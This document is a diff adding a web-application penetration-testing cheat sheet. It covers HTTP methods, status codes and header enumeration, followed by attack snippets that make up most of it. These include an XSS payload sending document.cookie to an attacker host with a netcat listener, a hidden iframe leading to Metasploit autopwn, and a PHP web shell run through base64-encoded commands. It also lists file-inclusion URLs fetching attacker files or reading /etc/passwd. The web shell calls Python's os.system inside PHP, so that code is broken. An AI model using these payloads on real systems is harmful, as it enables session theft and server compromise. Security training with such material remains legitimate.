@@ -1,0 +1,193 @@
+Web Apps
+
+
+# HTTP Methods or Verbs
+
+GET       Does not have a body and passes all parameters in the URL.
+POST      Send data to a server. Passes all parameters in the body of the request.
+PUT       Used for adding content to a web app, common with RESTful APIs.
+DELETE    Used for deleting content from a web app, common with RESTful APIs.
+HEAD      The web app will only return the response headers, not the body.
+OPTIONS   Show a list of HTTP options that the server supports.
+CONNECT   Set up a tunnel between a client and a server for SSL encryption or an HTTP proxy. 
+TRACE     Used for debugging.
+------------------------------------------------------------------------------------------------------
+
+# HTTP Response Codes
+
+100       Continue
+200       OK
+301       Moved Permanently
+302       Found
+400       Bad Request
+401       Unauthorized
+403       Forbidden
+404       Not Found
+500       Internal Server Error
+------------------------------------------------------------------------------------------------------
+
+# Simple web server to share out code
+
+Change directory to where your scripts and web shells are located.
+cd /root/scripts/
+python -m SimpleHTTPServer 80
+------------------------------------------------------------------------------------------------------
+
+# Browser Redirection
+
+<iframe SRC="http://attackerIP/report" height = "0" width ="0">
+hacker:  use Metasploit browser autopwn listening on hackerip
+------------------------------------------------------------------------------------------------------
+
+# Cisco Router
+
+x is between 15 and 99.
+https://targetIP/level/x/exec/-/show
+------------------------------------------------------------------------------------------------------
+
+# Cookie Security Issues - missing HttpOnly or Secure attribute
+
+HttpOnly - prevents JavaScript from accessing the cookie
+Secure - only send over an encrypted channel
+
+Firefox
+Cookies > View Cookie Information
+HttpOnly cookie tells the browser if a Java scripts tries to access the cookie, the browser should not 
+return a value.
+------------------------------------------------------------------------------------------------------
+
+# Cookie Stealing
+
+<script>new Image().src="http://attackerIP/test.php?"+ document.cookie;</script>
+hacker:  nc -lvp 80
+------------------------------------------------------------------------------------------------------
+
+# File upload vuln
+
+Create a php file called evil.php 
+<?php
+$cmd=$_GET["cmd"];
+$decode=base64_decode($cmd);
+os.system($decode);
+?>
+
+Once the malicious file is in place, pass base64 encoded commands to it, and get basic code execution 
+on the web server, as the "apache" user.
+
+wget -O output -o /dev/null www.target.com/photos/evil.php?cmd=$(echo id|base64)
+cat output
+
+wget -O output -o /dev/null www.target.com/photos/evil.php?cmd=$(echo ifconfig|base64)
+cat output
+------------------------------------------------------------------------------------------------------
+
+# Fuzzing
+
+When fuzzing headers, disable URL Encode.
+When you are inside of a POST parameter, always use URL encoding.
+------------------------------------------------------------------------------------------------------
+
+# Headers, Apache version, eTag, HTTP Basic Authentication Enabled
+
+telnet <target IP> 80
+HEAD / HTTP/1.0
+(hit enter 2x)
+
+curl -iksX HEAD <target IP>
+
+for i in `cat 80.txt` ; do curl -iksX HEAD http://$i/ > $i 2>&1 ; echo Scanned $i ; done
+------------------------------------------------------------------------------------------------------
+
+# HTTP methods allowed
+
+telnet <target IP> 80
+OPTIONS / HTTP/1.0
+(hit enter 2x)
+
+curl -iksX OPTIONS <target IP>
+------------------------------------------------------------------------------------------------------
+
+# Local file inclusion
+
+http://localhost/index.php?page=/etc/passwd
+------------------------------------------------------------------------------------------------------
+
+# PHP version
+
+telnet <target IP> 80
+GET / HEAD/1.0
+
+http://target IP/aaaaa.php
+
+Firefox > Web Developer Toolbar > Information > View Response Headers
+------------------------------------------------------------------------------------------------------
+
+# Remote File Inclusion
+
+http://target IP/index.php?page=http://attackerIP/evil.txt
+------------------------------------------------------------------------------------------------------
+
+# URL Encoding
+
+%20       space
+%40   @   at
+%26   &   ampersand
+%28   (   open parenthesis
+%29   )   close parenthesis
+%3B   ;   semicolon
+%22   "   double quote
+%27   '   single quote
+%3C   <   less than
+%3E   >   greater than
+%2E   .   period
+%2F   /   forward slash
+
+Example: <script>alert(document.cookie);</script>
+Encoded: %3Cscript%3Ealert%28document%2Ecookie%29%3B%3C%2Fscript%3E
+------------------------------------------------------------------------------------------------------
+
+# WebDAV extensions are enabled
+
+msfconsole
+use auxiliary/scanner/http/webdav_scanner
+
+./davtest.pl -url http://target-IP
+
+for i in $(cat 80.txt); do cadaver -t $i; done
+------------------------------------------------------------------------------------------------------
+
+# WordPress
+
+wpscan -u www.target.com -e u vp vt -r
+
+cd /usr/share/wpscan/
+stop_user_enumeration_bypass.rb www.target.com --ids 1-1000
+------------------------------------------------------------------------------------------------------
+
+# XML Injection
+
+Single quote         foo'
+Double quote         foo"
+Greater than         foo>
+Less than            foo<			
+Comment tag          foo<!--
+Ampersand            &foo
+------------------------------------------------------------------------------------------------------
+
+# XSS
+
+Stored - example: guestbook
+<script>alert("XSS");</script>
+<script>alert(document.cookie);</script>
+<iframe SRC="http://attackerIP" height="0" width="0"></iframe>
+<script>new Image().src="http://attakerIP/test.php?output="+document.cookie;</script>
+
+curl http://target.com/login.php?user=`perl –e 'print "a" x 500'`
+------------------------------------------------------------------------------------------------------
+
+# External How-To
+
+http://bughunting.guide/a-gentle-introduction-to-cross-site-scripting-xss/
+http://bughunting.guide/discovering-xss-vulnerabilities-with-burp-intruder/
+https://nvisium.com/blog/2014/01/31/accurate-xss-detection-with-burpsuite/
+https://forum.bugcrowd.com/t/tutorial-injectx-to-find-xss/790
